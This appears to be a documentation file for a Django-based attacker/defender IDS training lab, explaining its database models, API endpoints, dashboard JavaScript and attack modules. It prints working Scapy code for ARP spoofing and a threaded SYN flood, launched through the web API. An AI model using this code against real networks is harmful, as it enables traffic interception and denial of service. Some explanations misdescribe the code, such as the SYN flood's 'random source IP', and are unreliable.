# Complete Code Explanation - Everything You Need to Understand

## Table of Contents
1. [Project Structure](#project-structure)
2. [Database Layer](#database-layer)
3. [Backend API Layer](#backend-api-layer)
4. [Frontend Layer](#frontend-layer)
5. [Attack Modules](#attack-modules)
6. [Complete Request Flow](#complete-request-flow)
7. [Data Models](#data-models)
8. [File-by-File Breakdown](#file-by-file-breakdown)

---

## Project Structure

```
testIDS/
├── manage.py                           # Django entry point (manages everything)
├── db.sqlite3                          # Database file (stores all data)
├── requirements.txt                    # All Python packages needed
│
├── web_interface/                      # Django project folder
│   ├── settings.py                     # Configuration (database, apps, security)
│   ├── urls.py                         # Main URL router
│   ├── asgi.py                         # WebSocket server config
│   ├── wsgi.py                         # WSGI server config
│   │
│   └── cybersec_app/                   # Main Django app
│       ├── models.py                   # Database schema (User, AttackLog, etc.)
│       ├── views.py                    # API endpoints & business logic
│       ├── urls.py                     # URL patterns for this app
│       ├── admin.py                    # Django admin setup
│       ├── apps.py                     # App configuration
│       │
│       ├── templates/                  # HTML files
│       │   ├── base.html               # Base template (header, footer)
│       │   ├── login.html              # Login page
│       │   ├── attacker.html           # Attacker dashboard
│       │   └── defender.html           # Defender dashboard
│       │
│       ├── static/                     # CSS, JS files
│       │   ├── css/styles.css
│       │   └── js/main.js
│       │
│       ├── management/commands/        # Custom management commands
│       │   └── create_users.py         # Command: python manage.py create_users
│       │
│       ├── migrations/                 # Database migration files
│       │   └── 0001_initial.py         # Initial schema creation
│       │
│       └── __pycache__/                # Compiled Python files (ignore)
│
├── modules/                            # Attack & defense modules
│   ├── arp_spoof.py                    # ARP spoofing attack
│   ├── syn_flood.py                    # SYN flood attack
│   ├── network_scanner.py              # Network scanning
│   ├── traffic_sniffer.py              # Packet capture
│   └── detector.py                     # IDS detection logic
│
├── utils/                              # Helper utilities
│   ├── network_utils.py                # Network helper functions
│   └── logger.py                       # Logging system
│
└── docs/                               # Documentation
    ├── SYSTEM_EXPLAINED.md             # High-level overview
    ├── simple_class_diagram.puml       # Architecture diagram
    └── COMPLETE_CODE_EXPLANATION.md    # This file!
```

---

## Database Layer

### What is a Database?
A **database** stores all your data persistently (doesn't disappear when server restarts). We use **SQLite** (simple file-based database).

### Where is the Database?
- **File**: `db.sqlite3` (in project root)
- **Connection**: Defined in `web_interface/settings.py`

```python
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': BASE_DIR / 'db.sqlite3',
    }
}
```

**Translation**: "Use SQLite database stored in db.sqlite3 file"

---

### Database Models (web_interface/cybersec_app/models.py)

Models = **Tables in the database**. Each model is a table with columns (fields).

#### 1. **User Model** (Custom Authentication)

```python
class User(AbstractUser):
    """Extends Django's built-in User with roles"""
    
    role = CharField(
        max_length=10,
        choices=UserRole.choices,  # ATTACKER, DEFENDER, ADMIN
        default=UserRole.ATTACKER
    )
    
    machine_type = CharField(
        max_length=20,
        null=True,
        help_text="kali or ubuntu"
    )
    
    groups = ManyToManyField(
        'auth.Group',
        related_name='custom_user_set'
    )
```

**Database Table: `users`**
```
id | username | password_hash | email | role | machine_type | first_name | last_name
1  | attacker | sha256hash... | ...   | ATTACKER | kali | Red | Team
2  | defender | sha256hash... | ...   | DEFENDER | ubuntu | Blue | Team
3  | admin    | sha256hash... | ...   | ADMIN | NULL | Admin | User
```

**What it does:**
- Stores user accounts
- Each user has a role (attacker/defender/admin)
- Password is hashed (encrypted) for security

**Key Methods:**
- `is_attacker()` - Returns True if user can launch attacks
- `is_defender()` - Returns True if user can monitor attacks
- `is_admin_user()` - Returns True if user is admin

---

#### 2. **AttackLog Model**

```python
class AttackLog(Model):
    """Records every attack launched"""
    
    user = ForeignKey(User, on_delete=CASCADE)  # Which user launched it?
    attack_type = CharField(max_length=50)      # "ARP", "SYN_FLOOD"
    target_ip = GenericIPAddressField()         # IP being attacked (192.168.189.20)
    gateway_ip = GenericIPAddressField()        # Gateway IP for ARP attack
    target_port = IntegerField()                # Port being attacked (80, 443, etc.)
    packets_sent = IntegerField()               # How many packets sent
    status = CharField(max_length=20)           # "running", "stopped", "completed"
    start_time = DateTimeField()                # When attack started
    end_time = DateTimeField()                  # When attack ended
    notes = TextField()                         # Additional info
```

**Database Table: `attack_logs`**
```
id | user_id | attack_type | target_ip | gateway_ip | packets_sent | status | start_time
1  | 1 (attacker) | ARP | 192.168.189.20 | 192.168.189.2 | 1500 | stopped | 2025-12-11 21:30:00
2  | 1 (attacker) | SYN_FLOOD | 192.168.189.20 | NULL | 45000 | running | 2025-12-11 21:35:00
```

**What it does:**
- Logs every attack that's launched
- Useful for analyzing attack history
- Can replay attacks later

---

#### 3. **DetectionLog Model**

```python
class DetectionLog(Model):
    """Records every attack that was DETECTED"""
    
    alert_type = CharField(max_length=50)      # "ARP_SPOOF", "SYN_FLOOD"
    severity = CharField(max_length=20)        # "LOW", "MEDIUM", "HIGH", "CRITICAL"
    source_ip = GenericIPAddressField()        # Attack source (192.168.189.10)
    target_ip = GenericIPAddressField()        # Attack target (192.168.189.20)
    detected_at = DateTimeField()              # When detected
    details = JSONField(default=dict)          # Extra info (as JSON)
    is_blocked = BooleanField()                # Was attacker blocked?
    blocked_at = DateTimeField()               # When blocked
```

**Database Table: `detection_logs`**
```
id | alert_type | severity | source_ip | target_ip | details | detected_at
1  | ARP_SPOOF | HIGH | 192.168.189.10 | 192.168.189.20 | {..} | 2025-12-11 21:30:01
2  | SYN_FLOOD | CRITICAL | 192.168.189.10 | 192.168.189.20 | {..} | 2025-12-11 21:35:01
```

**What it does:**
- Logs every attack the IDS detected
- Used by defender to see attacks happening
- Records severity level for alerting

---

#### 4. **Configuration Model**

```python
class Configuration(Model):
    """System-wide settings (like config file)"""
    
    key = CharField(max_length=100, unique=True)    # Setting name
    value = JSONField()                             # Setting value (can be any JSON)
```

**Database Table: `configuration`**
```
key | value
"arp_threshold" | 10
"syn_threshold" | 100
"alert_email" | "admin@ids.local"
```

---

## Backend API Layer

### What is an API?
An **API** (Application Programming Interface) = interface between frontend (browser) and backend (server).

**Communication Pattern:**
```
Browser (Frontend)
    ↓ sends JSON request
Django Views (Backend)
    ↓ processes request
Database
    ↓ returns data
Django Views
    ↓ sends JSON response
Browser (Frontend)
```

---

### URLs Routing (web_interface/cybersec_app/urls.py)

```python
urlpatterns = [
    path('login/', views.login_view, name='login'),
    path('logout/', views.logout_view, name='logout'),
    path('attacker/', views.attacker_dashboard, name='attacker_dashboard'),
    path('defender/', views.defender_dashboard, name='defender_dashboard'),
    
    # API Endpoints (JSON responses)
    path('api/attack/arp/start/', views.start_arp_attack, name='start_arp'),
    path('api/attack/arp/stop/', views.stop_arp_attack, name='stop_arp'),
    path('api/attack/syn/start/', views.start_syn_attack, name='start_syn'),
    path('api/attack/syn/stop/', views.stop_syn_attack, name='stop_syn'),
    path('api/attack/stats/', views.get_attack_stats, name='attack_stats'),
    path('api/scan/start/', views.start_scan, name='start_scan'),
    path('api/scan/results/<str:scan_id>/', views.get_scan_results, name='scan_results'),
    path('api/sniff/start/', views.start_sniffer, name='start_sniff'),
    path('api/sniff/packets/<str:sniffer_id>/', views.get_packets, name='get_packets'),
    path('api/sniff/stop/', views.stop_sniffer, name='stop_sniff'),
    path('api/network/info/', views.get_network_info, name='network_info'),
]
```

**What this means:**
- `/login/` → displays login page
- `/attacker/` → shows attacker dashboard
- `/api/attack/arp/start/` → **API endpoint** to start ARP attack

---

### Views (web_interface/cybersec_app/views.py)

**A View = A function that handles a URL request**

#### 1. **Authentication Views**

```python
def login_view(request):
    """Handle login"""
    if request.method == 'POST':
        # User submitted login form
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        # Verify credentials in database
        user = authenticate(username=username, password=password)
        
        if user is not None:
            # Login successful
            login(request, user)
            return redirect('attacker_dashboard')  # Redirect to dashboard
        else:
            # Login failed - show error
            return render(request, 'login.html', {'error': 'Invalid credentials'})
    
    # GET request - show login form
    return render(request, 'login.html')
```

**What it does:**
1. User visits `/login/`
2. Django calls `login_view(request)`
3. If POST (form submission):
   - Check username/password against database
   - If correct: login user, redirect to dashboard
   - If wrong: show error message
4. If GET: show login form

---

#### 2. **Dashboard Views**

```python
@login_required(login_url='login')  # Must be logged in
def attacker_dashboard(request):
    """Show attacker dashboard"""
    
    # Check if user is attacker
    if not request.user.is_attacker():
        return HttpResponse('Access Denied', status=403)
    
    # Get local IP and gateway
    local_ip = get_local_ip()
    gateway_ip = get_gateway_ip()
    
    # Pass data to HTML template
    context = {
        'local_ip': local_ip,
        'gateway_ip': gateway_ip,
        'user': request.user
    }
    
    return render(request, 'attacker.html', context)
```

**What it does:**
1. User visits `/attacker/`
2. Check if logged in (if not, redirect to login)
3. Check if user has attacker role
4. Get system info (local IP, gateway)
5. Render HTML template with that info

---

#### 3. **ARP Attack API Endpoint**

```python
@api_view(['POST'])  # Only accepts POST requests
@login_required
def start_arp_attack(request):
    """Start ARP spoofing attack"""
    
    # Check permissions
    if not request.user.is_attacker():
        return Response({'error': 'Permission denied'}, status=403)
    
    # Get parameters from request JSON
    data = request.data
    victim_ip = data.get('target_ip')
    gateway_ip = data.get('gateway_ip')
    interface = data.get('interface') or 'eth0'
    interval = data.get('interval', 2)
    
    # Validate inputs
    if not victim_ip or not gateway_ip:
        return Response({'error': 'Missing parameters'}, status=400)
    
    # Create unique attack ID
    attack_id = f"arp_{victim_ip}_{gateway_ip}"
    
    # Check if attack already running
    if attack_id in active_attacks:
        return Response({'error': 'Attack already running'}, status=400)
    
    # Create ARP spoofer object
    spoofer = ARPSpoofer(victim_ip, gateway_ip, interface)
    
    # Start attack in background thread
    thread = threading.Thread(
        target=spoofer.start,
        args=(interval,),
        daemon=True
    )
    thread.start()
    
    # Store attack info in memory
    active_attacks[attack_id] = {
        'object': spoofer,
        'type': 'arp',
        'target_ip': victim_ip,
        'gateway_ip': gateway_ip,
        'packets_sent': 0,
        'start_time': datetime.now()
    }
    
    # Log to database
    AttackLog.objects.create(
        user=request.user,
        attack_type='ARP_SPOOFING',
        target_ip=victim_ip,
        gateway_ip=gateway_ip,
        status='running',
        packets_sent=0
    )
    
    # Return JSON response
    return Response({
        'status': 'started',
        'attack_id': attack_id,
        'message': f'ARP spoofing started against {victim_ip}'
    })
```

**What it does:**
1. Receives JSON POST request with victim IP, gateway IP
2. Validates user has attacker role
3. Creates ARPSpoofer object
4. Starts it in background thread (doesn't block)
5. Stores attack info in memory dictionary
6. Logs to database
7. Returns JSON success response

**Request Example (from JavaScript):**
```javascript
fetch('/api/attack/arp/start/', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        target_ip: '192.168.189.20',
        gateway_ip: '192.168.189.2',
        interface: 'eth0',
        interval: 2
    })
})
.then(r => r.json())
.then(data => console.log(data))
```

**Response Example:**
```json
{
    "status": "started",
    "attack_id": "arp_192.168.189.20_192.168.189.2",
    "message": "ARP spoofing started against 192.168.189.20"
}
```

---

#### 4. **Stop ARP Attack**

```python
@api_view(['POST'])
@login_required
def stop_arp_attack(request):
    """Stop ARP spoofing and restore ARP tables"""
    
    data = request.data
    attack_id = data.get('attack_id')
    
    # Get the attack from memory
    if attack_id not in active_attacks:
        return Response({'error': 'Attack not found'}, status=404)
    
    attack_info = active_attacks[attack_id]
    spoofer = attack_info['object']
    
    # Stop the spoofer (restores ARP tables)
    spoofer.stop()
    
    # Remove from memory
    del active_attacks[attack_id]
    
    # Update database
    AttackLog.objects.filter(
        target_ip=attack_info['target_ip'],
        status='running'
    ).update(
        status='stopped',
        end_time=datetime.now()
    )
    
    return Response({
        'status': 'stopped',
        'message': 'ARP spoofing attack stopped and ARP tables restored'
    })
```

---

#### 5. **Get Attack Statistics**

```python
@api_view(['GET'])
@login_required
def get_attack_stats(request):
    """Return stats on running attacks"""
    
    attacks = {}
    
    # Loop through all active attacks
    for attack_id, attack_info in active_attacks.items():
        attacks[attack_id] = {
            'type': attack_info['type'],
            'target_ip': attack_info['target_ip'],
            'packets_sent': attack_info['packets_sent'],
            'status': 'running'
        }
    
    return Response({'attacks': attacks})
```

**Response Example:**
```json
{
    "attacks": {
        "arp_192.168.189.20_192.168.189.2": {
            "type": "arp",
            "target_ip": "192.168.189.20",
            "packets_sent": 350,
            "status": "running"
        }
    }
}
```

---

#### 6. **Network Scanner Endpoint**

```python
@api_view(['POST'])
@login_required
def start_scan(request):
    """Start network scanning"""
    
    data = request.data
    network_range = data.get('network_range')  # e.g., "192.168.189.0/24"
    full_scan = data.get('full_scan', False)
    
    # Create scanner object
    scanner = NetworkScanner()
    
    # Create unique scan ID
    scan_id = str(uuid.uuid4())
    
    # Start scan in background
    def run_scan():
        hosts = scanner.identify_active_machines(network_range, full_scan)
        # Store results in memory
        active_scanners[scan_id]['hosts'] = hosts
        active_scanners[scan_id]['status'] = 'completed'
    
    thread = threading.Thread(target=run_scan, daemon=True)
    thread.start()
    
    # Store scan info
    active_scanners[scan_id] = {
        'object': scanner,
        'network_range': network_range,
        'hosts': [],
        'status': 'in_progress'
    }
    
    return Response({
        'scan_id': scan_id,
        'status': 'started',
        'message': f'Scanning {network_range}...'
    })
```

---

#### 7. **Traffic Sniffer**

```python
@api_view(['POST'])
@login_required
def start_sniffer(request):
    """Start packet sniffer"""
    
    data = request.data
    bpf_filter = data.get('filter')  # e.g., "tcp port 80"
    
    # Create sniffer object
    sniffer = TrafficSniffer(filter=bpf_filter)
    
    # Create unique sniffer ID
    sniffer_id = str(uuid.uuid4())
    
    # Start sniffing in background
    thread = threading.Thread(
        target=sniffer.start,
        daemon=True
    )
    thread.start()
    
    # Store sniffer info
    active_sniffers[sniffer_id] = {
        'object': sniffer,
        'filter': bpf_filter,
        'packets': [],
        'status': 'capturing'
    }
    
    return Response({
        'sniffer_id': sniffer_id,
        'status': 'started'
    })


@api_view(['GET'])
@login_required
def get_packets(request, sniffer_id):
    """Get captured packets"""
    
    if sniffer_id not in active_sniffers:
        return Response({'error': 'Sniffer not found'}, status=404)
    
    sniffer = active_sniffers[sniffer_id]['object']
    
    # Get packets from sniffer
    packets = sniffer.get_packets(limit=50)
    stats = sniffer.get_statistics()
    
    return Response({
        'sniffer_id': sniffer_id,
        'packets': packets,
        'stats': stats,
        'status': 'capturing'
    })
```

---

#### 8. **System Info (with Shield CPU)**

```python
@api_view(['GET'])
@login_required
def get_network_info(request):
    """Get system information and CPU/RAM metrics"""
    
    # Get CPU and RAM usage
    cpu_usage = psutil.cpu_percent(interval=0.1)
    ram_usage = psutil.virtual_memory().percent
    
    return Response({
        'local_ip': get_local_ip(),
        'gateway_ip': get_gateway_ip(),
        'active_attacks': len(active_attacks),
        'active_scans': len(active_scanners),
        'active_sniffers': len(active_sniffers),
        'cpu_usage': cpu_usage,        # Shield CPU!
        'ram_usage': ram_usage         # Shield CPU!
    })
```

---

## Frontend Layer

### HTML Structure (attacker.html)

```html
{% extends 'base.html' %}

<!-- Login check: Only logged-in attacker can see this -->
{% block title %}⚔️ Attacker Interface{% endblock %}

{% block content %}
<div class="attacker-container">
    <!-- HEADER -->
    <div class="attacker-header">
        <h1>⚔️ Attacker Interface</h1>
        <div class="user-info">
            <span>👤 {{ user.username }}</span>
            <a href="{% url 'logout' %}">Logout</a>
        </div>
    </div>
    
    <!-- TAB NAVIGATION -->
    <div class="tab-navigation">
        <button class="tab-btn active" onclick="switchTab('attacks', this)">
            🎯 Attacks
        </button>
        <button class="tab-btn" onclick="switchTab('scanner', this)">
            🔍 Scanner
        </button>
        <button class="tab-btn" onclick="switchTab('sniffer', this)">
            📦 Sniffer
        </button>
        <button class="tab-btn" onclick="switchTab('info', this)">
            ℹ️ Info
        </button>
    </div>
    
    <!-- TAB 1: ATTACKS -->
    <div id="attacks-tab" class="tab-content active">
        <!-- ARP Attack Form -->
        <div class="attack-card">
            <h2>🎭 ARP Spoofing</h2>
            <input type="text" id="arp-victim-ip" placeholder="Victim IP">
            <input type="text" id="arp-gw-ip" placeholder="Gateway IP">
            <button onclick="startARPAttack()">Start</button>
            <button onclick="stopARPAttack()">Stop</button>
            <div id="arp-status-box"></div>
        </div>
        
        <!-- SYN Flood Form -->
        <div class="attack-card">
            <h2>💥 SYN Flooding</h2>
            <input type="text" id="syn-target-ip" placeholder="Target IP">
            <input type="number" id="syn-port-val" value="80">
            <button onclick="startSYNAttack()">Start</button>
            <button onclick="stopSYNAttack()">Stop</button>
            <div id="syn-status-box"></div>
        </div>
        
        <!-- Stats Table -->
        <div class="stats-panel">
            <h3>📊 Attack Statistics</h3>
            <div id="attack-stats-div"></div>
        </div>
    </div>
    
    <!-- TAB 2: SCANNER -->
    <div id="scanner-tab" class="tab-content">
        <input type="text" id="scan-range" placeholder="192.168.189.0/24">
        <button onclick="startNetworkScan()">Start Scan</button>
        <div id="scan-results-div"></div>
    </div>
    
    <!-- TAB 3: SNIFFER -->
    <div id="sniffer-tab" class="tab-content">
        <input type="text" id="sniffer-filter-val" placeholder="tcp port 80">
        <button onclick="startTrafficSniff()">Start</button>
        <div id="packet-list-div"></div>
    </div>
    
    <!-- TAB 4: INFO (with Shield CPU) -->
    <div id="info-tab" class="tab-content">
        <div class="info-card">
            <h3>Network</h3>
            <p>Local IP: <span id="info-local-ip-val"></span></p>
            <p>Gateway: <span id="info-gateway-ip-val"></span></p>
        </div>
        
        <!-- Shield CPU Card -->
        <div class="info-card shield-cpu-card">
            <h3>🛡️ Shield CPU</h3>
            <div class="shield-icon">🛡️</div>
            <p>CPU Usage: <span id="shield-cpu-usage">0%</span></p>
            <div class="cpu-bar">
                <div id="shield-cpu-bar" class="cpu-bar-fill"></div>
            </div>
            <p>RAM Usage: <span id="shield-ram-usage">0%</span></p>
            <div class="ram-bar">
                <div id="shield-ram-bar" class="ram-bar-fill"></div>
            </div>
            <p id="shield-status">✅ System Status: Healthy</p>
        </div>
    </div>
</div>
{% endblock %}
```

---

### JavaScript Logic (Embedded in attacker.html)

#### 1. **Tab Switching**

```javascript
// Switch between tabs when user clicks button
function switchTab(tabName, button) {
    // Hide all tabs
    const tabs = document.querySelectorAll('.tab-content');
    tabs.forEach(tab => tab.classList.remove('active'));
    
    // Show selected tab
    document.getElementById(tabName + '-tab').classList.add('active');
    
    // Update button styling
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    button.classList.add('active');
}
```

**What it does:**
1. User clicks tab button
2. Hide all content divs
3. Show the selected one
4. Update button styling

---

#### 2. **Start ARP Attack**

```javascript
async function startARPAttack() {
    // Get form input values
    const victimIP = document.getElementById('arp-victim-ip').value;
    const gatewayIP = document.getElementById('arp-gw-ip').value;
    
    // Validate
    if (!victimIP || !gatewayIP) {
        alert('Please fill all fields');
        return;
    }
    
    // Send JSON POST request to server
    const response = await fetch('/api/attack/arp/start/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRFToken': getCookie('csrftoken')  // Security token
        },
        body: JSON.stringify({
            target_ip: victimIP,
            gateway_ip: gatewayIP,
            interface: '',  // Auto-detect
            interval: 2
        })
    });
    
    // Parse response
    const data = await response.json();
    
    if (response.ok) {
        // Success!
        currentARPAttackId = data.attack_id;
        
        // Update UI
        document.getElementById('arp-btn-start').disabled = true;
        document.getElementById('arp-btn-stop').disabled = false;
        showStatus('arp-status-box', '✅ ' + data.message, 'success');
        
        // Start polling for updates every 2 seconds
        refreshAttackStats();
        setInterval(refreshAttackStats, 2000);
    } else {
        // Error
        showStatus('arp-status-box', '❌ ' + data.error, 'error');
    }
}
```

**What it does:**
1. Get victim IP and gateway IP from form
2. Send JSON POST to server API
3. If success: 
   - Store attack ID
   - Update UI buttons
   - Show success message
   - Start polling for stats
4. If error: show error message

---

#### 3. **Stop ARP Attack**

```javascript
async function stopARPAttack() {
    if (!currentARPAttackId) return;
    
    // Send stop request
    const response = await fetch('/api/attack/arp/stop/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRFToken': getCookie('csrftoken')
        },
        body: JSON.stringify({
            attack_id: currentARPAttackId
        })
    });
    
    const data = await response.json();
    
    // Update UI
    document.getElementById('arp-btn-start').disabled = false;
    document.getElementById('arp-btn-stop').disabled = true;
    showStatus('arp-status-box', '✅ ' + data.message, 'success');
    
    currentARPAttackId = null;
}
```

---

#### 4. **Refresh Attack Stats**

```javascript
async function refreshAttackStats() {
    // Get stats from server
    const response = await fetch('/api/attack/stats/');
    const data = await response.json();
    
    // Build HTML table
    let html = '<table class="stats-table">';
    html += '<th>Type</th><th>Target</th><th>Packets</th><th>Status</th>';
    
    for (const [id, attack] of Object.entries(data.attacks)) {
        html += `
            <tr>
                <td>${attack.type}</td>
                <td>${attack.target_ip}</td>
                <td>${attack.packets_sent}</td>
                <td>${attack.status}</td>
            </tr>
        `;
    }
    
    html += '</table>';
    
    // Update page
    document.getElementById('attack-stats-div').innerHTML = html;
}
```

**What it does:**
1. Fetch `/api/attack/stats/` from server
2. Loop through attacks
3. Build HTML table rows
4. Display on page
5. Called every 2 seconds → shows live updates

---

#### 5. **Network Scanner**

```javascript
async function startNetworkScan() {
    const range = document.getElementById('scan-range').value;
    
    // Start scan
    const response = await fetch('/api/scan/start/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRFToken': getCookie('csrftoken')
        },
        body: JSON.stringify({
            network_range: range,
            full_scan: false
        })
    });
    
    const data = await response.json();
    currentScanId = data.scan_id;
    
    // Poll for results every 2 seconds
    const scanInterval = setInterval(async () => {
        const res = await fetch(`/api/scan/results/${currentScanId}/`);
        const scanData = await res.json();
        
        // Build results table
        let html = '<table><tr><th>IP</th><th>MAC</th><th>Hostname</th><th>Ports</th></tr>';
        
        for (const host of scanData.hosts) {
            html += `
                <tr>
                    <td>${host.ip}</td>
                    <td>${host.mac}</td>
                    <td>${host.hostname}</td>
                    <td>${host.open_ports.join(', ')}</td>
                </tr>
            `;
        }
        
        html += '</table>';
        document.getElementById('scan-results-div').innerHTML = html;
        
        // Stop polling when done
        if (scanData.status === 'completed') {
            clearInterval(scanInterval);
        }
    }, 2000);
}
```

---

#### 6. **Traffic Sniffer**

```javascript
async function startTrafficSniff() {
    const filter = document.getElementById('sniffer-filter-val').value;
    
    // Start sniffer
    const response = await fetch('/api/sniff/start/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRFToken': getCookie('csrftoken')
        },
        body: JSON.stringify({
            filter: filter || null,
            count: 0
        })
    });
    
    const data = await response.json();
    currentSnifferId = data.sniffer_id;
    
    // Poll for packets
    const sniffInterval = setInterval(async () => {
        const res = await fetch(`/api/sniff/packets/${currentSnifferId}/`);
        const packets = await res.json();
        
        // Build packet list
        let html = '';
        for (const pkt of packets.packets) {
            html += `
                <div class="packet-item">
                    ${pkt.timestamp} | ${pkt.protocol} | 
                    ${pkt.src}→${pkt.dst} | ${pkt.info}
                </div>
            `;
        }
        
        document.getElementById('packet-list-div').innerHTML = html;
    }, 1000);
}
```

---

#### 7. **Get CSRF Token**

```javascript
// Django requires CSRF token for POST requests (security)
function getCookie(name) {
    let cookieValue = null;
    if (document.cookie) {
        const cookies = document.cookie.split(';');
        for (let cookie of cookies) {
            if (cookie.trim().startsWith(name + '=')) {
                cookieValue = decodeURIComponent(cookie.split('=')[1]);
            }
        }
    }
    return cookieValue;
}
```

**What it does:**
- Django sets a `csrftoken` cookie
- Before sending POST, we extract it from cookies
- Include it in request headers
- Django verifies it (prevents CSRF attacks)

---

#### 8. **Refresh System Info (with Shield CPU)**

```javascript
async function refreshSystemInfo() {
    // Get system info from server
    const response = await fetch('/api/network/info/');
    const data = await response.json();
    
    // Update Network info
    document.getElementById('info-local-ip-val').textContent = data.local_ip;
    document.getElementById('info-gateway-ip-val').textContent = data.gateway_ip;
    document.getElementById('info-attacks-val').textContent = data.active_attacks;
    
    // Update Shield CPU metrics
    const cpuUsage = Math.round(data.cpu_usage * 100) / 100;
    document.getElementById('shield-cpu-usage').textContent = cpuUsage + '%';
    document.getElementById('shield-cpu-bar').style.width = cpuUsage + '%';
    
    const ramUsage = Math.round(data.ram_usage * 100) / 100;
    document.getElementById('shield-ram-usage').textContent = ramUsage + '%';
    document.getElementById('shield-ram-bar').style.width = ramUsage + '%';
    
    // Update status color
    const statusElem = document.getElementById('shield-status');
    if (data.cpu_usage > 90 || data.ram_usage > 95) {
        statusElem.className = 'shield-status-critical';
        statusElem.textContent = '🚨 System Status: Critical';
    } else if (data.cpu_usage > 80 || data.ram_usage > 85) {
        statusElem.className = 'shield-status-warning';
        statusElem.textContent = '⚠️ System Status: High Resource Usage';
    } else {
        statusElem.className = 'shield-status-good';
        statusElem.textContent = '✅ System Status: Healthy';
    }
}

// Call every 2 seconds
setInterval(refreshSystemInfo, 2000);
```

---

## Attack Modules

### ARP Spoof (modules/arp_spoof.py)

```python
from scapy.all import ARP, Ether, sendp, get_if_hwaddr
import threading
import time

class ARPSpoofer:
    """Performs ARP spoofing (man-in-the-middle)"""
    
    def __init__(self, victim_ip, gateway_ip, interface=None):
        self.victim_ip = victim_ip           # IP to poison (192.168.189.20)
        self.gateway_ip = gateway_ip         # Gateway IP (192.168.189.2)
        self.interface = interface or 'eth0' # Network interface
        self.running = False
        self.packets_sent = 0
        
        # Get attacker's MAC address
        try:
            self.attacker_mac = get_if_hwaddr(self.interface)
        except:
            self.attacker_mac = '00:11:22:33:44:55'  # Fallback
    
    def start(self, interval=2):
        """Start ARP spoofing"""
        self.running = True
        
        while self.running:
            try:
                # Create ARP packet 1: "I am the gateway"
                # This tells the victim: the gateway's IP now maps to MY MAC
                pkt1 = Ether(dst='ff:ff:ff:ff:ff:ff')  # Broadcast
                pkt1 /= ARP(
                    op='is-at',                        # ARP reply
                    pdst=self.victim_ip,               # Target IP
                    hwdst='ff:ff:ff:ff:ff:ff',        # Broadcast MAC
                    psrc=self.gateway_ip,              # This is the gateway IP
                    hwsrc=self.attacker_mac            # But this is MY MAC (lie!)
                )
                
                # Create ARP packet 2: "I am the victim"
                # This tells the gateway: the victim's IP now maps to MY MAC
                pkt2 = Ether(dst='ff:ff:ff:ff:ff:ff')  # Broadcast
                pkt2 /= ARP(
                    op='is-at',
                    pdst=self.gateway_ip,              # Target IP
                    hwdst='ff:ff:ff:ff:ff:ff',
                    psrc=self.victim_ip,               # This is the victim IP
                    hwsrc=self.attacker_mac            # But this is MY MAC (lie!)
                )
                
                # Send both packets
                sendp(pkt1, iface=self.interface, verbose=False)
                sendp(pkt2, iface=self.interface, verbose=False)
                
                # Count packets
                self.packets_sent += 2
                
                # Wait before next round
                time.sleep(interval)
                
            except Exception as e:
                print(f"ARP Error: {e}")
                break
    
    def stop(self):
        """Stop spoofing and restore ARP tables"""
        self.running = False
        
        # Send corrective ARP packets to restore original mapping
        # Tell victim: gateway's IP maps to gateway's REAL MAC
        try:
            # Get gateway's real MAC by ARP ping (simplified)
            gateway_mac = '08:00:27:00:00:01'  # Example
            
            # Restore victim's ARP table
            restore_pkt = Ether(dst='ff:ff:ff:ff:ff:ff')
            restore_pkt /= ARP(
                op='is-at',
                pdst=self.victim_ip,
                hwdst='ff:ff:ff:ff:ff:ff',
                psrc=self.gateway_ip,
                hwsrc=gateway_mac  # Real gateway MAC
            )
            
            sendp(restore_pkt, iface=self.interface, verbose=False)
            
        except Exception as e:
            print(f"Restore Error: {e}")
```

**How it works (step by step):**

1. **Attacker gets its own MAC address** from interface
2. **Creates two malicious ARP packets:**
   - Packet 1: "I (192.168.189.10) am the gateway (192.168.189.2)"
   - Packet 2: "I (192.168.189.10) am the victim (192.168.189.20)"
3. **Sends them in a loop** every N seconds
4. **Victim receives packets** and updates ARP table:
   - 192.168.189.2 → 00:11:22:33:44:55 (attacker)
   - 192.168.189.20 → 00:11:22:33:44:55 (attacker)
5. **Now ALL traffic flows through attacker** (man-in-the-middle)
6. **On stop:** sends corrective packets to restore real MAC mapping

---

### SYN Flood (modules/syn_flood.py)

```python
from scapy.all import IP, TCP, send
import threading
import random

class SYNFlooder:
    """Performs SYN flooding DOS attack"""
    
    def __init__(self, target_ip, target_port, num_threads=10):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.running = False
        self.packets_sent = 0
    
    def start(self, duration=None):
        """Start flooding"""
        self.running = True
        
        # Create N threads
        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(
                target=self.send_packets,
                daemon=True
            )
            t.start()
            threads.append(t)
    
    def send_packets(self):
        """Worker thread: send SYN packets"""
        while self.running:
            try:
                # Create IP packet
                ip = IP(dst=self.target_ip)
                
                # Create TCP SYN packet
                tcp = TCP(
                    sport=random.randint(1024, 65535),  # Random source port
                    dport=self.target_port,             # Target port (80, 443)
                    flags='S'                           # SYN flag
                )
                
                # Combine and send
                packet = ip / tcp
                send(packet, verbose=False)
                
                # Count packet
                self.packets_sent += 1
                
            except Exception as e:
                print(f"SYN Flood Error: {e}")
                break
    
    def stop(self):
        """Stop flooding"""
        self.running = False
```

**How it works:**

1. **Creates N worker threads** (default 10)
2. **Each thread:**
   - Creates TCP SYN packet with random source IP/port
   - Sends to target:port (192.168.189.20:80)
   - Repeats as fast as possible
3. **Server receives thousands of SYN packets:**
   - Allocates memory for each connection
   - Waits for ACK (which never comes)
   - Connection table fills up
4. **Result:** Legitimate users can't connect (DOS)

---

### Network Scanner (modules/network_scanner.py)

```python
from scapy.all import ARP, Ether, srp
import socket

class Host:
    """Represents a discovered host"""
    def __init__(self, ip, mac, hostname='', open_ports=None):
        self.ip = ip
        self.mac = mac
        self.hostname = hostname
        self.open_ports = open_ports or []
    
    def to_dict(self):
        return {
            'ip': self.ip,
            'mac': self.mac,
            'hostname': self.hostname,
            'open_ports': self.open_ports
        }


class NetworkScanner:
    """Scans network for active hosts"""
    
    def identify_active_machines(self, network_range, full_scan=False):
        """
